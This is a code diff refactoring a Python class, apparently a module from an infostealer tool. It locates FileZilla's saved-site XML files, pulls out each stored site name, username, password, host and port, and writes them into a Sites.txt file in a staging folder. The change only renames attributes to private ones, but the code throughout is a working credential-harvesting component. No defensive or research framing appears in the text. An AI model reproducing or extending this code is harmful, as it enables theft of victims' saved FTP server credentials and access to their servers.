@@ -9,25 +9,26 @@ class FileZilla:
 
     def __init__(self, storage_path: str, folder: str, errors: bool):
 
-        self.config = FileZillaConfig()
-        self.storage_path = storage_path
-        self.folder = folder
-        self.errors = errors
+        self.__storage_path = storage_path
+        self.__folder = folder
+        self.__errors = errors
+
+        self.__config = FileZillaConfig()
 
     def __create_folder(self):
 
-        folder = rf"{self.storage_path}\{self.folder}"
+        folder = rf"{self.__storage_path}\{self.__folder}"
 
         if not path.exists(folder):
             makedirs(folder)
 
     def __get_sites(self):
 
-        if not path.exists(self.config.SitesPath):
+        if not path.exists(self.__config.SitesPath):
             return
 
-        files = listdir(self.config.SitesPath)
-        data_files = self.config.DataFiles
+        files = listdir(self.__config.SitesPath)
+        data_files = self.__config.DataFiles
 
         if not any(file in data_files for file in files):
             return
@@ -38,8 +39,8 @@ class FileZilla:
 
         for file in data_files:
 
-            root = ElementTree.parse(rf"{self.config.SitesPath}\{file}").getroot()
-            data = self.config.FileZillaData
+            root = ElementTree.parse(rf"{self.__config.SitesPath}\{file}").getroot()
+            data = self.__config.FileZillaData
 
             if not root:
                 continue
@@ -55,7 +56,7 @@ class FileZilla:
 
                 temp.append(data.format(site_name, site_user, site_pass, site_host, site_port))
 
-        with open(rf"{self.storage_path}\{self.folder}\Sites.txt", "a", encoding="utf-8") as file_zilla:
+        with open(rf"{self.__storage_path}\{self.__folder}\Sites.txt", "a", encoding="utf-8") as file_zilla:
             file_zilla.write("".join(item for item in temp))
 
     def run(self):
@@ -65,4 +66,4 @@ class FileZilla:
             self.__get_sites()
 
         except Exception as e:
-            if self.errors is True: print(f"[FilleZilla]: {repr(e)}")
+            if self.__errors is True: print(f"[FilleZilla]: {repr(e)}")
